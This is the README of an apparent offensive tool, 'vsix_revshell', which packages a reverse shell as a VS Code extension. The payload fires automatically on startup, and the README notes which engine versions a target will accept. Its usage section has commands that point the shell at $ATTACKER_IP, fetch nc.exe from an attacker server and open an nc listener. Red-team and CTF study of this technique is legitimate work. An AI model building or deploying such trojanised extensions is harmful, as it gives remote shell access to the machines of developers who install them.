# vsix_revshell

> Generate a reverse shell packaged as a VS Code extension (`.vsix`).

A `.vsix` is a ZIP archive in OPC format. When VS Code loads the extension it
calls `activate()`, which runs a payload through `child_process`. This tool
builds the full package (OPC manifests + code) with no external dependency and
no `vsce`, using only the Python standard library (`zipfile`).

For authorized lab / CTF / engagement use only.

## Install

With `pipx` (recommended, isolated):

```bash
pipx install git+https://github.com/Goultarde/vsix_revshell.py
# or directly from a checkout path
pipx install  .
```

Both expose the `vsix-revshell` command. You can also run it without installing:

```bash
python3 vsix_revshell.py -i $ATTACKER_IP -p $PORT
```

## Usage

```bash
# PowerShell (default, Windows target)
vsix-revshell -i $ATTACKER_IP -p $PORT -o evil.vsix

# nc.exe downloaded from a controlled server
vsix-revshell -i $ATTACKER_IP -p $PORT --type nc --nc-url http://$ATTACKER_IP:8000/nc.exe

# bash (Linux / macOS target)
vsix-revshell -i $ATTACKER_IP -p $PORT --type bash

# arbitrary command
vsix-revshell -i $ATTACKER_IP -p $PORT --type cmd --cmd "calc.exe"
```

Then start a listener and drop the `.vsix` where it will be installed:

```bash
rlwrap nc -lvnp $PORT
```

## Options

| Option | Description |
|---|---|
| `-i, --lhost` | Listener IP (LHOST), required |
| `-p, --lport` | Listener port (LPORT), required |
| `-o, --output` | Output `.vsix` file (default: `revshell.vsix`) |
| `-t, --type` | `powershell` (default), `nc`, `bash`, `cmd` |
| `--nc-url` | URL of `nc.exe` for `--type nc` |
| `--cmd` | Raw command for `--type cmd` |
| `--engine` | Required VS Code engine version (default: `1.118.0`) |
| `--name` | Extension id/name |
| `--display-name` | Display name |
| `--publisher` | Publisher |
| `--version` | Extension version |

## Structure of a generated .vsix

```
[Content_Types].xml          OPC MIME types (required)
extension.vsixmanifest       identity + Engine property
extension/package.json       engines.vscode, main, activationEvents
extension/extension.js       activate() -> cp.exec(payload)
```

Critical fields for automatic execution without interaction:

- `activationEvents: ["onStartupFinished", "*"]` triggers the code on startup.
- `engines.vscode` and the `Microsoft.VisualStudio.Code.Engine` property must
  match the version constraint enforced on the target, otherwise the install
  is rejected.

## Requirements

- Python 3.7+ (standard library only)
